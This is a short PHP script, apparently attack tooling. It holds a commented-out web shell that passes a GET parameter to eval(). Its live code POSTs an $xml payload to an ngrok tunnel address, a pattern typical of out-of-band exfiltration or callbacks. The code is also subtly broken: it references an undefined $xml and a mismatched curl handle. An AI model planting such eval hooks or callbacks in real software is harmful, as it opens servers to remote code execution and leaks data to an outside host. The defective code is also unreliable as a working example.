<?php
	// $code = $_GET['code'];
	// eval($code);

	// Send a POST request to https://f889-185-187-131-200.ngrok.io
	$url = 'https://f889-185-187-131-200.ngrok.io';
	$ch = curl_init($url);

	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

	$response = curl_exec($ch);
	curl_close($ch);
?>
